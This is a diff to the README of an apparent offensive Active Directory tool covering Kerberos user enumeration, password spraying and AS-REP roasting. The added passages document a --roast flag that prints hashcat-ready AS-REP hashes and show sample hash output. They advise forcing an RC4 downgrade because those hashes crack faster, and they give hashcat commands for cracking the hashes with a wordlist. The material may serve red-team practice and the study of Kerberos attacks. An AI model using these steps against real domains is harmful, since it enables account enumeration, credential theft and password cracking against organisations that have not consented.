@@ -62,9 +62,10 @@ small, curated user list beats a full domain dump for spray ops.
 Sends an AS-REQ without pre-authentication for each username. The KDC
 response classifies the account: `PREAUTH_REQUIRED` means the user exists,
 `PRINCIPAL_UNKNOWN` means it does not. If the KDC returns an AS-REP directly
-(no pre-auth required), the account is flagged as AS-REP roastable. No
-`badPwdCount` increment. Generates event **4768** if Kerberos audit logging
-is enabled.
+(no pre-auth required), the account is flagged as AS-REP roastable — and
+with `--roast`, the encrypted portion is extracted and printed as a
+hashcat-ready hash. No `badPwdCount` increment. Generates event **4768** if
+Kerberos audit logging is enabled.
 
 ```
 userenum -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
@@ -73,7 +74,8 @@ userenum -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <use
 ```
 userenum -d contoso.local /home/operator/users.txt
 userenum -d contoso.local --dc 192.168.1.10 --safe -v /home/operator/users.txt
-userenum -d contoso.local --delay 500 /home/operator/users.txt
+userenum -d contoso.local --roast /home/operator/users.txt
+userenum -d contoso.local --roast --downgrade /home/operator/users.txt
 ```
 
 ### passwordspray
@@ -144,12 +146,14 @@ All four commands accept the following optional flags:
 | `--downgrade` | Force RC4-HMAC (etype 23) pre-auth only. Skips the AES-256 attempt. Use against legacy DCs that do not support AES. |
 | `--safe` | Abort all remaining attempts the moment any account comes back as locked out. |
 | `-v` | Verbose — also log wrong passwords, not-found users, and errors (silent by default). |
+| `--roast` | (`userenum` only) Extract and print the AS-REP encrypted portion as a hashcat-ready hash when a no-preauth account is found. Off by default. |
 
 ### Output tags
 
 ```
 [+] VALID USER                    account exists, pre-auth required              (userenum)
 [+] ASREP ROASTABLE (no pre-auth) account has no pre-auth — hash is capturable   (userenum)
+[HASH] $krb5asrep$...             AS-REP hash ready for offline cracking          (--roast)
 [+] VALID LOGIN                   correct credentials                             (spray/brute)
 [+] VALID (expired)               correct credentials but password is expired
 [!] LOCKED/DISABLED               account is locked or disabled
@@ -324,6 +328,9 @@ encrypt PA-ENC-TIMESTAMP:
 
 BCrypt is the only external provider used. No CRT, no third-party libraries.
 
+The `--roast` flag adds DER parsing of the AS-REP `enc-part [6]` field to
+extract the etype and cipher bytes without any additional crypto operations.
+
 ### Network
 
 All requests use **TCP port 88** with the standard 4-byte big-endian length
@@ -350,10 +357,41 @@ retries with RC4 and still flags the account.
 ### AS-REP roastable accounts
 
 `userenum` identifies accounts with the `DoesNotRequirePreAuth` flag set: the
-KDC responds with a full AS-REP (etype negotiated from the advertised list)
-without requiring encrypted pre-authentication. The BOF flags these with
-`[+] ASREP ROASTABLE (no pre-auth)`. The encrypted portion of the AS-REP
-can be extracted offline with Impacket's `GetNPUsers.py` or hashcat mode 18200.
+KDC responds with a full AS-REP without requiring encrypted pre-authentication.
+The BOF flags these with `[+] ASREP ROASTABLE (no pre-auth)`.
+
+Add `--roast` to extract the encrypted portion directly and print a
+hashcat-ready hash:
+
+```
+userenum --roast -d corp.local --dc 10.0.0.1 users.txt
+
+[+] ASREP ROASTABLE (no pre-auth): svc_backup@corp.local
+[HASH] $krb5asrep$18$svc_backup@CORP.LOCAL:aabbccddee...
+```
+
+Hash formats and hashcat modes:
+
+| Etype | Condition | Hash prefix | Hashcat mode |
+|---|---|---|---|
+| 18 (AES-256) | Default — modern DC | `$krb5asrep$18$...` | `-m 19700` |
+| 17 (AES-128) | DC prefers AES-128 | `$krb5asrep$17$...` | `-m 19600` |
+| 23 (RC4) | `--downgrade` + RC4 enabled on DC | `$krb5asrep$23$...` | `-m 18200` |
+
+RC4 hashes (mode 18200) crack significantly faster than AES (modes 19600/19700)
+because RC4 key derivation is a single MD4 hash, while AES uses PBKDF2-HMAC-SHA1
+with 4096 iterations. If the target domain allows RC4, use `--downgrade` to
+request the faster-to-crack hash:
+
+```
+userenum --roast --downgrade -d corp.local --dc 10.0.0.1 users.txt
+```
+
+Crack with hashcat:
+```bash
+hashcat -m 19700 hashes.txt rockyou.txt   # AES-256
+hashcat -m 18200 hashes.txt rockyou.txt   # RC4
+```
 
 ---
 
@@ -386,3 +424,4 @@ can be extracted offline with Impacket's `GetNPUsers.py` or hashcat mode 18200.
 - [RFC 3961](https://datatracker.ietf.org/doc/html/rfc3961) — Encryption and Checksum Specifications for Kerberos 5
 - [RFC 4757](https://datatracker.ietf.org/doc/html/rfc4757) — RC4-HMAC Kerberos encryption
 - [RFC 4120](https://datatracker.ietf.org/doc/html/rfc4120) — The Kerberos Network Authentication Service (V5)
+- [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — modes 18200, 19600, 19700
